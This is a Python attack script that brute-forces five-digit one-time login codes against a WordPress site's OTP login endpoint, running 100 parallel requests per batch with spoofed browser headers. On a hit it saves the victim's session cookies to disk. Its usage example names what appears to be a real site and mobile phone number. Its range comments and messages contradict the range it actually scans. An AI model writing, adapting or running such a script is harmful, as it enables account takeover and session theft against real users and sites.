import requests
import json
from http.cookiejar import MozillaCookieJar
from concurrent.futures import ThreadPoolExecutor
import time
import sys

def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retries=1):
    headers = {
        "Host": host,
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-Ch-Ua": "\"Chromium\";v=\"133\", \"Not(A:Brand\";v=\"99\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": f"https://{host}",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": f"https://{host}/login/?action=login-by-otp&mobile={mobile}",
        "Priority": "u=1, i"
    }

    data = {
        "login_otp_nonce": login_otp_nonce,
        "_wp_http_referer": f"/login/?action=login-by-otp&mobile={mobile}",
        "action": "kandopanel_login_by_otp",
        "mobile": mobile,
        "code[1]": str(code_values[0]),
        "code[2]": str(code_values[1]),
        "code[3]": str(code_values[2]),
        "code[4]": str(code_values[3]),
        "code[5]": str(code_values[4])
    }

    url = f"https://{host}/wp-admin/admin-ajax.php"
    code_str = ''.join(map(str, code_values))

    for attempt in range(max_retries + 1):
        try:
            response = requests.post(url, headers=headers, data=data, timeout=10)
            response.raise_for_status()

            try:
                json_response = response.json()
                if json_response.get("success"):
                    print(f"Success with code {code_str} (number {counter})!")
                    print("Message:", json_response["data"]["message"])
                    print("Redirect to:", json_response["data"]["redirect"])

                    cookie_jar = MozillaCookieJar(f"cookies_success_{code_str}.txt")
                    for cookie in response.cookies:
                        cookie_jar.set_cookie(cookie)
                    cookie_jar.save(ignore_discard=True, ignore_expires=True)
                    print(f"Cookies saved in cookies_success_{code_str}.txt")
                    return True
                else:
                    print(f"Failed with code {code_str} (number {counter}): {json_response}")
                    return False
            except json.JSONDecodeError:
                print(f"Error parsing JSON for code {code_str} (number {counter})")
                print(f"Server response text: {response.text}")
                return False

        except requests.exceptions.RequestException as e:
            print(f"Network error with code {code_str} (number {counter}), attempt {attempt + 1}/{max_retries + 1}: {str(e)}")
            if attempt < max_retries:
                time.sleep(1)
                continue
            return False

def generate_code(counter):
    code_str = f"{counter:05d}"
    return [int(digit) for digit in code_str]

# گرفتن آرگومان‌ها از خط فرمان
if len(sys.argv) != 4:
    print("Usage: python script_00000_25000.py <host> <login_otp_nonce> <mobile>")
    print("Example: python script_00000_25000.py www.arzanpanel-iran.com 9d6178e07d 09039495749")
    sys.exit(1)

host = sys.argv[1]
login_otp_nonce = sys.argv[2]
mobile = sys.argv[3]

# تنظیمات رنج
start_range = 25000
end_range = 50000
batch_size = 100

found_success = False
for batch_start in range(start_range, end_range, batch_size):
    if found_success:
        break

    batch_end = min(batch_start + batch_size, end_range)
    codes = [generate_code(i) for i in range(batch_start, batch_end)]

    with ThreadPoolExecutor(max_workers=batch_size) as executor:
        futures = {
            executor.submit(send_request, host, login_otp_nonce, mobile, code, batch_start + idx + 1): idx
            for idx, code in enumerate(codes)
        }

        for future in futures:
            try:
                if future.result():
                    found_success = True
                    break
            except Exception as e:
                print(f"Exception in future for code {batch_start + futures[future] + 1}: {str(e)}")

    if not found_success:
        time.sleep(1)

if not found_success:
    print("No successful code found in range 00000-25000.")
else:
    print("Process stopped because a successful code was found!")
